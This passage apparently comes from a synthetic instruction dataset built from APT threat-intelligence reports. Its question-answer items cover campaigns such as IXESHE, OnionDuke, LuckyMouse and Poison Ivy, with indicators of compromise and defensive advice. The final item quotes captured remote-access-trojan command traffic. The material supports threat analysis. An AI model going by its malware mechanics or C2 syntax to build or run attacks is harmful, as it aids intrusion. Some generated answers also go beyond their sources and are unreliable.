    "output": "The custom multiplication function used by Tavdig differs from the standard implementation in that it performs the modulus operation implicitly at every step by shifting the result to the right within the finite field. This approach ensures that the bit width of the factor never exceeds 1025 bits, whereas in the standard implementation, the factor can grow up to 2048 bits, requiring a more complex modulus operation afterward. The advantage of this method is its efficiency, as it avoids the need for a separate modulus operation after multiplication. However, this method results in a 'too small' value after processing all 1024 bits, specifically ab/(2^1024) instead of ab. To correct this, Tavdig uses a 'corrector' value, which is initialized to 1 and then multiplied by 2 a total of 2048 times. This corrector value is used to normalize the result to the modulus. After each multiplication, another multiplication with this corrector is performed to fix the 'too small' value. The corrector accounts for both the original multiplication error and the error introduced by the correction multiplication itself, hence it fixes for 2048 right shifts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: What happened?\nIn March 2018 we detected an ongoing campaign targeting a national data center in the Central Asia that we believe has been active since autumn 2017. The choice of target made this campaign especially significant \u2013 it meant the attackers gained access to a wide range of government resources at one fell swoop. We believe this access was abused, for example, by inserting malicious scripts in the country's official websites in order to conduct watering hole attacks.\nThe operators used the HyperBro Trojan as their last-stage in-memory remote administration tool (RAT). The timestamps for these modules are from December 2017 until January 2018. The anti-detection launcher and decompressor make extensive use of Metasploit's shikata_ga_nai encoder as well as LZNT1 compression.\nKaspersky Lab products detect the different artifacts used in this campaign with the following verdicts: Trojan.Win32.Generic, Trojan-Downloader.Win32.Upatre and Backdoor.Win32.HyperBro. A full technical report, IoCs and YARA rules are available from our intelligence reporting service (contact us intelligence@kaspersky.com).\n\nWhy did the LuckyMouse APT group choose to target a national data center in Central Asia, and how did they leverage this access to conduct further attacks?",
    "output": "A: The LuckyMouse APT group targeted a national data center in Central Asia because it provided them with access to a wide range of government resources in one single operation. This strategic choice allowed them to maximize their impact and efficiency. Once they gained access to the data center, they inserted malicious scripts into the country's official websites. These scripts were used to conduct watering hole attacks, which are designed to compromise visitors to these websites. By targeting a centralized resource like a national data center, the attackers could potentially infect a large number of users who interact with government services, thereby expanding the scope of their campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the USB Worm component of the Crimson malware used by the Transparent Tribe APT group replicate itself and spread to other systems?",
    "output": "A computer worm is a standalone malware computer program that replicates itself in order to spread to other computers. In the case of the USB Worm component of the Crimson malware used by the Transparent Tribe APT group, it replicates itself by creating a copy of itself in the drive root directory of removable media, using the same directory name and changing the directory attribute to 'hidden'. This results in all the actual directories being hidden and replaced with a copy of the malware using the same directory name. The worm also uses an icon that mimics a Windows directory, tricking the user into executing the malware when trying to access a directory. Additionally, if the worm is executed from removable media, it will check if the 'Thin Client' or the 'Main Client' is running on the system, and if not, it will connect to a remote Crimson Server and try to use a specific 'USBW' command to download and execute the 'Thin Client' component.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: real c&c location\nOne very interesting error revealed more insights into the C&C network's setup. One of the malware samples we tested was designed to access xxx.xxawan.com via port 443, which, at that time, resolved to xx.xxx.114.87:443, a server located in the United States. The sample, however, received the following error message from the server:\nThis indicated that the front-end servers actually functioned as proxy servers and that the true C&C servers were hidden behind this initial group of C&C servers. This made the network more resistant to takedown and analysis. Due to a server error, however, the attackers revealed the location of one of their back-end servers. We discovered that the IP address, xx.xx.x2.202, is located in Guangdong, China.\nThe particular error returned looked very similar to errors generated by a tool called \"HTran.\"10 HTran stands for \"HUC Packet Transmit Tool,\" a connection bouncer that redirects TCP traffic destined for one host to an alternate host, keeping the real host hidden from view. \"HUC,\" in this case, stands for the hacking group, \"Honker Union of China.\" It was coded by a hacker who goes by the handle \"lion.\" This tool's error-checking code, however, is flawed. Assuming that everything properly works, the tool functions very well as a proxy server but if the real server is currently inaccessible, HTran will send an error message, revealing its whereabouts.\nRunning a port scan on this server revealed some open ports shown in the table below.\nBased on OS fingerprinting, the server appears to be running Windows 7 Enterprise Server. With only a few open ports, however, it was very difficult to confirm this. In addition, we did not receive a response when we tried to connect to these ports.\n10\nBig Headline: ATTRIBUTION AND UNIQUE FINGERPRINTS\nPrevious research on the IXESHE campaign indicated several connections to groups possibly from China. In addition, the IP address hiding behind the HTran instance was an IP range assigned to China.\nUpon further investigation of the \"manufact\" campaign, however, it appears that the gang behind it may be English speakers. The name of the campaign, for one, is most likely a shortened form of \"manufacturing.\" The OS the C&C server uses is also an English install of Microsoft XP. It is also likely, of course, that the C&C server is a compromised machine so it does not use the attackers' first language.\nThe malware samples, which appear to have been developed using C++, had a number of strings and error codes in English such as \"Enter command\" and \"Receive command error!\"\nThe date format used in the campaign codes (i.e., MMDD) also provided us a clue as to where the attackers may be from. This date format is only commonly used in China, Korea, Iran, Japan, Hungary, Lithuania, and the United States.\nBased on the limited amount of information we gathered about the attackers, it was very difficult to pinpoint their exact location.\nMedium Headline: unique fingerprints and modus operandi\nAn attack can be considered associated with the gang behind the IXESHE campaign if it exhibits the following characteristics:\n\u2022 Uses a specially crafted targeted email with a malicious file attachment\n\u2022 Uses document exploits, primarily .PDF files, to drop malware into target systems\n\u2022 Uses malware detected by security vendors as IXESHE variants\n\u2022 Uses a malware that sends a GET request to the C&C server in the following format:\nhttp://[C&C Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]\n\u2022 Uses dynamic DNS services for or compromised machines as C&C servers\nBig Headline: TIMELINE\nThis section lists known incidents exhibiting the same threat actor behaviors and so may be from the same group behind IXESHE dating to as far back as July 2009. With the exception of the samples described in ContagioDump, the dates for other samples refer to when the respective sandboxes saw them for the first time. As such, these dates should be considered \"at least by\" and not the actual date of the attack.\n\u2022 15 October 2009\n\u2022 PDF name/Subject hook: \u4e2d\u5171\u4e8c\u70ae\u90e8\u968a\u5c0e\u5f48\u4e4b\u767c\u5c55\n\u2022 MD5: 16a9f340c0d353332ba6f525376c93e1\n\u2022 C&C: xxxxxupsenter.byinter.net\n\u2022 Info:\n\u2022 Campaign code: [LY]MAIL_20091015\n\u2022 18 December 2009\n\u2022 PDF name/Subject hook: \u5973\u5175\u812b\u8863\u6bd4\u4e2d\u6307 \u62cd\u7167PO\u4e0a\u7db2\n\u2022 MD5: 8950bbedf4a7f1d518e859f9800f9347\n\u2022 C&C: xxxxxfo.athersite.com\n\u2022 Info:\n\u2022 Campaign code: ML_20091216\n\u2022 28 December 2009\n\u2022 PDF name/Subject hook: Consumer Welfare Table\n\u2022 MD5: c61c231d93d3bd690dd04b6de7350abb\n\u2022 C&C: xxx.xx6.148.42 or xxx.xx6.202.49\n\u2022 Info:\n\u2022 Campaign code: ML_20091223\n\u2022 26 April 2010\n\u2022 PDF name/Subject hook: [\u7814\u8a0e\u6703]\u958b\u5357\u5927\u5b78\u516c\u5171\u4e8b\u52d9\u7ba1\u7406\u5b78\u7cfb\u7b2c\u4e94\u5c46\u300c\u5168\u7403\u5316\u8207\u884c\u653f\u6cbb\u7406\u300d\u570b\u969b\u5b78\u8853\u7814\u8a0e\u6703\n\u2022 MD5: 58de08c1155a775b760049dff3f5abe4\n\u2022 C&C: xxx.x.x5.26\n\u2022 Info:\n\u2022 Campaign code: ML0419._30m\n\u2022 6 May 2010\n\u2022 PDF name/Subject hook: \u8521\u653f\u6587\u6559\u6388\u4e03\u5341\u83ef\u8a95\u7cfb\u5217\u6d3b\u52d5\u7c21\u5831\n\u2022 MD5: d80eb21cfe8ad1a710c8652b13f8b7ac\n\u2022 C&C: xxx.xx9.124.13\n\u2022 Info:\n\u2022 Campaign code: LY_ML0430_30m\n\u2022 10 May 2010\n\u2022 XLS name/Subject hook: 99\u4e0b\u534a\u5e74\u570b\u9632\u5de5\u696d\u8a55\u9451\u65e5\u671f\u8868\n\u2022 MD5: d4b98bda9c3ae0810a61f95863f4f81e\n\u2022 C&C: xxxxx.compreautos.com.br\n\u2022 Info:\n\u2022 Campaign code: CRML_0505\n\u2022 8 June 2010\n\u2022 XLS name/Subject hook: \u5929\u5b89\u8266\u5f8c\u7684\u671d\u9bae\u534a\u5cf6\u65b0\u5c40\u52e2\n\u2022 MD5: 100cf902ac31766f7d8a521eeb6f8d68\n\u2022 C&C: xxx.xx.187.130\n\u2022 Info:\n\u2022 Campaign code: MAIL0524\n\u2022 27 June 2010\n\u2022 PDF name/Subject hook: Discussion on Cross-Strait Maritime Cooperation\n\u2022 MD5: 6e14c7a424c2eef7f37810ff65650837\n\u2022 C&C: xxx.xx.128.71\n\u2022 Info:\n\u2022 Campaign code: ML0628\n\u2022 1 July 2010\n\u2022 PDF name/Subject hook: \u7b2c\u4e94\u6b21\u6c5f\u9673\u6703\u8ac7\u6210\u679c\u8a18\u8005\u6703\u672c\u6703\u8cf4\u4e3b\u59d4\u8b1b\u8a71\u7a3f\n\u2022 MD5: 949265ee1d3e587152a23311a85b3be9\n\u2022 C&C: xxx.xx.128.71\n\u2022 Info:\n\u2022 Campaign code: ML0628\n\u2022 28 July 2010\n\u2022 PDF name/Subject hook: Summary of Network Intelligence\n\u2022 MD5: 738af108a6edd46536492b1782589a04\n\u2022 C&C: xxx.xx6.54.189\n\u2022 Info:\n\u2022 Campaign code: [0713]\n\u2022 16 August 2010\n\u2022 PDF name/Subject hook: Communist China Removes Missiles\n\u2022 MD5: 6227e1594775773a182e1b631db5f6bb\n\u2022 C&C: xxxxxck.dnsrd.com or xxx.xx6.34.94 (appears to be a compromised computer of an East Asian university)\n\u2022 Info:\n\u2022 Campaign code: [0802]\n\u2022 17 August 2010\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 36ee61663fc41496642850c4293fed01\n\u2022 C&C: xxxxxck.dnsrd.com or xxx.xx6.34.94 (appears to be a compromised computer of an East Asian university)\n\u2022 Info:\n\u2022 Campaign code: [0802]\n\u2022 27 September 2010\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 313158192d4442013f7bedeb9def01ec\n\u2022 C&C: xx.xx.x3.102\n\u2022 Info:\n\u2022 Campaign code: [WH0827]\n\u2022 22 February 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: cd0eb6634ea684313389ddce553a6130\n\u2022 C&C: xxx.xx.228.58\n\u2022 Info:\n\u2022 Campaign code: [0222]\n\u2022 17 March 2011\n\u2022 XLS name/Subject hook: Japan Nuclear Radiation Leakage and Vulnerability Analysis\n\u2022 MD5: 7ca4ab177f480503653702b33366111f\n\u2022 C&C: xx.xxx.114.44\n\u2022 Info: http://contagiodump.blogspot.com/2011/03/ cve-2011-0609-adobe-flash-player.html\n\u2022 Campaign code: OM222\n\u2022 10 April 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 711542d883f8fca4aeac62ee1b7df6ca\n\u2022 C&C: xx.xx.x0.244\n\u2022 Info:\n\u2022 Campaign code: [LY0406]\n\u2022 20 April 2011\n\u2022 PDF name/Subject hook: China's Charm Diplomacy in BRICS Summit\n\u2022 MD5: ae39b747e4fe72dce6e5cdc6d0314c02\n\u2022 C&C: xx.xx.x9.165\n\u2022 Info:\n\u2022 Campaign code: [Removed due to privacy concerns]\n\u2022 20 April 2011\n\u2022 PDF name/Subject hook: The Obama Administration and the Middle East\n\u2022 MD5: 2368a8f55ee78d844896f05f94866b07\n\u2022 C&C: xx.xx.x9.165\n\u2022 Info:\n\u2022 Campaign code: {Removed due to privacy concerns]\n\u2022 20 April 2011\n\u2022 PDF name/Subject hook: Russia's profit from general NATO disunity\n\u2022 MD5: 4065b98fdcb17a081759061306239c8b\n\u2022 C&C: xx.xx.x9.165\n\u2022 Info:\n\u2022 Campaign code: [Removed due to privacy concerns]\n\u2022 22 April 2011\n\u2022 PDF name/Subject hook: Marshall Plan for the North Africa\n\u2022 MD5: 6d5fb801b890bfa7cc737c018e87e456\n\u2022 C&C: xx.xx.x9.165\n\u2022 Info:\n\u2022 Campaign code: [Removed due to privacy concerns]\n\u2022 28 April 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 14bf72167b4e801da205ecf9c0c55f9b\n\u2022 C&C: xx.xx.x33.2\n\u2022 Info:\n\u2022 Campaign code: [LY0420]\n\u2022 1 June 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 6ee4e08e6ab51208757fdc41d0e72846\n\u2022 C&C: xxxxxain.qpoe.com\n\u2022 Info:\n\u2022 Campaign code: [LY]MAIL_20090923\n\u2022 9 June 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 10f193f825ada183fcfd067434ca269e\n\u2022 C&C: xxxxxfo.AtHerSite.com\n\u2022 Info:\n\u2022 Campaign code: [LY]MAIL_20091208\n\u2022 21 September 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 32522cdc17a145486e26f35bdd524e7e\n\u2022 C&C: xxx.xx0.139.67\n\u2022 Info:\n\u2022 Campaign code: [LY0816]\n\u2022 12 October 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 8718ab5c1683a69c4e6092fdcb32cfa2\n\u2022 C&C: xxx.xx0.63.1\n\u2022 Info:\n\u2022 Campaign code: [CZ0921]\n\u2022 19 October 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 80dad66d6224d18babd9ada4a26aee75\n\u2022 C&C: xx.xxx.21.41 or king.pirat3.com\n\u2022 Info:\n\u2022 Campaign code: [WZ1011]\n\u2022 26 October 2011\n\u2022 PDF name/Subject hook: The Future Redefined 2011 AOEC CEO Summit\n\u2022 MD5: 3d91d9df315ffeb9bb1c774452b3114b\n\u2022 C&C: xxx.xxawan.com or xxx.xx4.230.120\n\u2022 Info:\n\u2022 Campaign code: 19\n\u2022 3 November 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: E25DBA0556124D7874D8416DE291CFE2\n\u2022 C&C: xxxxxfo.sdti.tw or xxx.xx2.246.110\n\u2022 Info:\n\u2022 Campaign code: [CR1031]\n\u2022 15 November 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: 829b78f1d1e74c2c5343a0aebb51f519\n\u2022 C&C: xxxxxaga.chickenkiller.com\n\u2022 Info:\n\u2022 Campaign code: [TL1109]\n\u2022 22 November 2011\n\u2022 PDF name/Subject hook: [Unknown]\n\u2022 MD5: c4a05230a898d91b30c88d52b3f069b3\n\u2022 C&C: xxx.xx6.54.150 or xxxxx.ItemDB.com\n\u2022 Info:\n\u2022 Campaign code: [WH1122]\n\nBased on the above text, answer a question. What clues did the IXESHE campaign provide regarding the potential origin and language of the attackers, and how did these clues complicate attribution efforts?",
    "output": "The IXESHE campaign provided several clues regarding the potential origin and language of the attackers. The use of English in the campaign name ('manufact'), the English install of Microsoft XP on the C&C server, and the English strings and error codes in the malware samples suggested that the attackers might be English speakers. Additionally, the date format used in the campaign codes (MMDD) is commonly used in several countries, including China, Korea, Iran, Japan, Hungary, Lithuania, and the United States. These clues complicated attribution efforts because they did not definitively point to a single country or language, making it difficult to pinpoint the exact location of the attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "OnionDuke: APT Attacks Via the Tor Network - F-Secure Weblog : News from the Lab\nRecently, (<http://www.leviathansecurity.com/blog/the-case-of-the-modified-binaries/>)research was published identifying a Tor exit node, located in Russia, that was consistently and maliciously modifying any uncompressed Windows executables downloaded through it. Naturally this piqued our interest, so we decided to peer down the rabbit hole. Suffice to say, the hole was a lot deeper than we expected! In fact, it went all the way back to the notorious Russian APT family MiniDuke, known to have been used in targeted attacks against NATO and European government agencies. The malware used in this case is, however, not a version of MiniDuke. It is instead a separate, distinct family of malware that we have since taken to calling OnionDuke. But lets start from the beginning.\nWhen a user attempts to download an executable via the malicious Tor exit node, what they actually receive is an executable \"wrapper\" that embeds both the original executable and a second, malicious executable. By using a separate wrapper, the malicious actors are able to bypass any integrity checks the original binary might contain. Upon execution, the wrapper will proceed to write to disk and execute the original executable, thereby tricking the user into believing that everything went fine. However, the wrapper will also write to disk and execute the second executable. In all the cases we have observed, this malicious executable has been the same binary (SHA1: a75995f94854dea8799650a2f4a97980b71199d2, detected as Trojan-Dropper:W32/OnionDuke.A). This executable is a dropper containing a PE resource that pretends to be an embedded GIF image file. In reality, the resource is actually an encrypted dynamically linked library (DLL) file. The dropper will proceed to decrypt this DLL, write it to disk and execute it.\n\nBased on the above text, answer a question. In the context of the OnionDuke APT attacks via the Tor network, how does the malicious Tor exit node modify the downloaded executables to bypass integrity checks and deliver malware? Explain the process step-by-step.",
    "output": "The malicious Tor exit node modifies uncompressed Windows executables by embedding them within a separate executable 'wrapper'. This wrapper contains both the original executable and a second, malicious executable. By using this wrapper, the attackers can bypass any integrity checks that the original binary might contain. When the user runs the downloaded executable, the wrapper first writes and executes the original executable, making the user believe that the download was successful. Simultaneously, the wrapper writes and executes the second, malicious executable. This malicious executable is a dropper (SHA1: a75995f94854dea8799650a2f4a97980b71199d2, detected as Trojan-Dropper:W32/OnionDuke.A), which contains a PE resource disguised as an embedded GIF image file but is actually an encrypted dynamically linked library (DLL) file. The dropper then decrypts this DLL, writes it to disk, and executes it.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Foreword\nThis report reviews an ongoing cyber-attack campaign dating back to mid-2014. Additional sources indicate this campaign may date as far back as 2011. We call this campaign Thamar Reservoir, named after one of the targets, Thamar E. Gindin1, who exposed new information about the attack and is currently assisting with the investigation.\nThe campaign includes several different attacks with the aim of taking over the target's computer or gain access to their email account. We estimate that this access is used for espionage or other nation-state interests, and not for monetary gain or hacktivism. In some cases, the victim is not the final target; the attackers use the infected computer, email, or stolen credentials as a platform to further attack their intended target.\nThe attackers are extremely persistent in their attempts to breach their targets. These attempts include:\n\uf0b7 Breaching trusted websites to set up fake pages\n\uf0b7 Multi-stage malware\n\uf0b7 Multiple spear phishing emails based on reconnaissance and information gathering.\n\uf0b7 Phone calls to the target.\n\uf0b7 Messages on social networks.\nWhile very successful in their attacks, the attackers are clearly not technically sophisticated. They are not new to hacking, but do make various mistakes, such as grammatical errors, exposure of attack infrastructure, easy to bypass anti analysis techniques, lack of code obfuscation, and more.\nThese mistakes enabled us to learn about their infrastructure and methods. More importantly, we have learned of 550 targets, most of them in the Middle East, from various fields: research about diplomacy, Middle East and Iran, international relations, and other fields; Defense and security; Journalism and human rights; and more.\nVarious characteristics of the attacks and their targets bring us to the conclusion that the threat actors are Iranian. In addition, we note that these attacks share characteristics with previously documented activities:\n\uf0b7 Attacks conducted using the Gholee malware, which we discovered.\n\uf0b7 Attacks reported by Trend Micro in Operation Woolen-Goldfish.\n\uf0b7 Attacks conducted by the Ajax Security Team as documented by FireEye.\n\uf0b7 Attacks seen during Newscaster as documented by iSight.\nFor further details and questions, or if you think you are a victim please contact us at: info [at] clearskysec.com\n1 Dr. Gindin is an expert on Iranian linguistics and Pre-Islamic Iran, renowned lecturer and research fellow at the Ezri Center for Iran and Persian Gulf Research in the University of Haifa.\nAnswer this question: What key indicators led to the conclusion that the threat actors behind the Thamar Reservoir campaign were Iranian, and how did these indicators align with previously documented activities?",
    "output": "The key indicators that led to the conclusion that the threat actors were Iranian included various characteristics of the attacks and their targets. These indicators aligned with previously documented activities such as attacks conducted using the Gholee malware, attacks reported by Trend Micro in Operation Woolen-Goldfish, attacks conducted by the Ajax Security Team as documented by FireEye, and attacks seen during Newscaster as documented by iSight. The shared characteristics and similarities in methodology across these documented activities strongly suggested that the threat actors were Iranian.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Poison Ivy Remote Access Tool (RAT) achieve persistence on a compromised system, allowing attackers to maintain their foothold even after system restarts or credential changes?",
    "output": "Persistence is a critical aspect of an Advanced Persistent Threat (APT) as it enables attackers to maintain their access to compromised systems over time. In the case of Poison Ivy, persistence is achieved through the use of a watchdog thread that is injected into the explorer.exe process. This thread automatically restarts the Poison Ivy server process if it is unexpectedly terminated by the target's operating system. Additionally, Poison Ivy's ability to inject code into legitimate processes and use a custom network protocol over TCP allows it to maintain its foothold on the system even after system restarts or credential changes. Furthermore, the 'persistence' option in Poison Ivy's configuration allows attackers to specify whether the RAT should maintain its connection to the compromised system even after a reboot. By leveraging these techniques, attackers using Poison Ivy can ensure that their access to the compromised system persists over time, allowing them to continue stealing sensitive data and intellectual property.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do attackers use phishing attacks to target financial institutions and online services, and what measures can be taken to prevent such attacks?",
    "output": "Phishing is a type of social engineering attack where attackers send fraudulent emails or messages that appear to be from a legitimate source, with the goal of tricking victims into revealing sensitive information or installing malware on their devices. According to the Microsoft Security Intelligence Report, phishing sites that target financial institutions and online services are particularly common, as they provide a potential means for attackers to gain direct access to victims' bank accounts or sensitive information. To prevent such attacks, it is essential to implement robust security measures, such as enabling two-factor authentication, using reputable antivirus software, and educating users on how to identify and avoid phishing attempts. Additionally, organizations can use filters that keep track of sites that host malware and phishing attacks and display prominent warnings when users try to navigate to them. By taking these measures, individuals and organizations can significantly reduce the risk of falling victim to phishing attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Defending Against Targeted Attacks\nSufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms like solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies that identify the data an organization is protecting and take into account the context of data use should be employed.\nMedium Headline: Local and External Threat Intelligence\nThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks use. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:\n\u2022 Enhancing visibility: Logs from endpoint, server, and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors, which can indicate a targeted attack.\n\u2022 Performing integrity checks: In order to maintain persistence, malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.\n\u2022 Empowering the human analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.\nTechnologies available today like Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.11 Deep Discovery uniquely detects and identifies evasive threats in real-time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.\n11\nMedium Headline: Mitigation and Cleanup Strategy\nOnce an attack is identified, the cleanup strategy should focus on the following objectives:\n\u2022 Determine the attack vector and cut off communications with the C&C server.\n\u2022 Determine the scope of the compromise.\n\u2022 Assess the damage by analyzing the data and forensic artifacts available on compromised machines.\nRemediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.\nMedium Headline: Data-Centric Protection Strategy\nThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.\nBig Headline: Trend Micro Threat Protection Against the Safe Campaign\nPart of processing and identifying the components of the Safe campaign is creating a list of indicators of compromise (IOCs) to help organizations better identify and locate certain tools, malware, and traffic patterns that could indicate compromise.\nThe following table summarizes the Trend Micro solutions for the components of the Safe campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.\nBig Headline: SAFE\n\u2022 First Seen\nIndividual targeted attacks are not one-off attempts. Attackers continually try to get inside the target's network.\nThe Safe campaign was first seen on October 2012.\n\u2022 Victims and Targets\nTargeted threats target specific industries or communities of interest in specific regions.\nThe Safe campaign was able to compromise government ministries, technology companies, media outlets, academic research institutions, and nongovernmental organizations.\nFurthermore, it was discovered that the average number of actual victims remained at 71 per day, with few if any changes from day to day.\n\u2022 Operations\nFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nThe Safe campaign attackers used spear-phishing emails with malicious attachments. Attackers used several malicious documents that all exploited a Microsoft Office\u00ae vulnerability (i.e., CVE-2012-0158). If opened with a version of Microsoft Word\u00ae that is not up-to-date, a malicious payload is silently installed on the user's computer.\nIn addition, one of the C&C servers used in the Safe campaign was set up in such a way that the contents of the directories were viewable to anyone who accessed them.\n\u2022 Possible Indicators of Compromise\nAttackers want to remain undetected as long as possible. A key characteristic of targeted attacks is stealth.\nBelow is a list of the components of the Safe campaign.\nNetwork traffic identifiers:\n\u00bb Network traffic going to mongolbaatarsonin. in\n\u00bb Network traffic going to withoutcake.com\n\u00bb Network traffic going to mongolbaatar.us \u00bb Network traffic going to getapencil.com\n\u00bb User-agent identified as \"Fantasia\"\n\u00bb Communication with any URL with the sub-URL, /safe/record.php\nHost-based identifiers:\n\u00bb Presence of SafeExt.dll on the host (commonly found in %Program Files%\\ Internet Explorer\\SafeNet\\)\n\u00bb Presence of SafeCredential.DAT on the host (commonly found in %Program Files%\\ Internet Explorer\\SafeNet\\)\n\u00bb Presence of the directory, %Program Files%\\Internet Explorer\\SafeNet\\\n\u00bb Modification of certain registry values\nMalware files:\n\u00bb TROJ_FAKESAFE.SMA\n\u00bb TROJ_DROPER.SMA\n\u00bb TROJ_DROPDET.A\n\u00bb TROJ_MDROP.DET\n\u00bb ADW_ADSTART\n\u00bb TROJ_CONNECT.DET\n* More information on the Safe campaign can be seen in the Trend Micro research paper, \".\"\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated, a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years experience, we deliver top-ranked client, server, and cloud-based security that fits our customers' and partners' needs; stops new threats faster; and protects data in physical, virtualized, and cloud environments. Powered by the Trend Micro\u2122 Smart Protection Network\u2122 infrastructure, our industry-leading cloud-computing security technology, products and services stop threats where they emerge, on the Internet, and are supported by 1,000+ threat intelligence experts around the globe. For additional information, visit (<http://www.trendmicro.com>)www.trendmicro.com.\n\nAnswer this question based on the above context: How can enterprises enhance their visibility to detect targeted attacks like the Safe campaign? What specific actions and technologies can be employed?",
    "output": "Enterprises can enhance their visibility to detect targeted attacks by aggregating logs from endpoint, server, and network monitoring. These logs provide a comprehensive view of activities within the organization, which can then be processed to identify anomalous behaviors indicative of a targeted attack. Technologies like Deep Discovery can provide visibility, insight, and control over networks to defend against targeted threats. Deep Discovery uniquely detects and identifies evasive threats in real-time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Basically, the response from the directory listing (date, time, file size, and file name) is sent back to the attacker in Base64 encoded format.\n- Process Manager window\nMain network traffic indicator of C2 activity through its \"Process Manager\" window:\no Process listing: \"proc|'|'|\"\no Killing a process: \"k|'|'|[Process_ID]\"\nproc|'|'|217.66.231.100:1185|'|'|pid|'|'|2396[endof]~[endof]proc|'|'|217.66.231.100:1185|'|'|~|'|'|33[endof]proc|'|'|217.66.2 31.100:1185|'|'|!|'|'|C:\\WINDOWS\\system32\\svchost.exe,976|'|'|C:\\WINDOWS\\Explorer.EXE,1804|'|'|C:\\Program\nFiles\\VMware\\VMware Tools\\vmacthlp.exe,960|'|'|C:\\Program Files\\Common Files\\Microsoft\nShared\\VS7DEBUG\\MDM.EXE,336|'|'|C:\\WINDOWS\\System32\\svchost.exe,1144|'|'|C:\\Program Files\\VMware\\VMware Tools\\TPAutoConnSvc.exe,1492|'|'|C:\\WINDOWS\\system32\\notepad.exe,1396|'|'|C:\\WINDOWS\\system32\\lsass.exe,7 76|'|'|C:\\Program Files\\VMware\\VMware\nTools\\TPAutoConnect.exe,2560|'|'|C:\\DOCUME~1\\Examiner\\LOCALS~1\\Temp\\ahbornad.exe,2396|'|'|C:\\WINDOWS\\sy stem32\\notepad.exe,416|'|'|C:\\WINDOWS\\system32\\services.exe,764|'|'|C:\\Program Files\\VMware\\VMware\nTools\\vmtoolsd.exe,656|'|'|C:\\WINDOWS\\system32\\svchost.exe,160|'|'|C:\\WINDOWS\\Microsoft.NET\\Framework\\v4.0.3 0319\\WPF\\WPFFontCache_v0400.exe,2896|'|'|C:\\WINDOWS\\system32\\svchost.exe,1024|'|'|C:\\WINDOWS\\system32\\c md.exe,540|'|'|C:\\WINDOWS\\system32\\smss.exe,572|'|'|C:\\WINDOWS\\system32\\wscntfy.exe,2264|'|'|C:\\WINDOWS\\sy stem32\\ctfmon.exe,1992|'|'|C:\\Program Files\\Symantec\\Norton Ghost\n2003\\GhostStartTrayApp.exe,1904|'|'|C:\\WINDOWS\\system32\\spoolsv.exe,1544|'|'|C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe,1896|'|'|C:\\Program Files\\Symantec\\Norton Ghost\n2003\\GhostStartService.exe,300|'|'|C:\\WINDOWS\\system32\\svchost.exe,1316|'|'|C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe,1888|'|'|\\??\\C:\\WINDOWS\\system32\\csrss.exe,640|'|'|C:\\WINDOWS\\system32\\rundll32.exe,188 0|'|'|\\??\\C:\\WINDOWS\\system32\\winlogon.exe,720|'|'|System,4|'|'|Idle,0|'|'|C:\\WINDOWS\\system32\\svchost.exe,1252|'|'| C:\\WINDOWS\\System32\\alg.exe,1872[endof]P[endof]P[endof]k|'|'|1396[endof]proc|'|'|217.66.231.100:1185|'|'|RM|'|'|13 96[endof]\nIn the above case, the Process Listing window opened in the Attacker's VM was used to kill a process in the Victim VM. Process information:\no Process path: C:\\WINDOWS\\system32\\notepad.exe\no Process ID: 1396\n- Registry window\nIn this case, the Registry 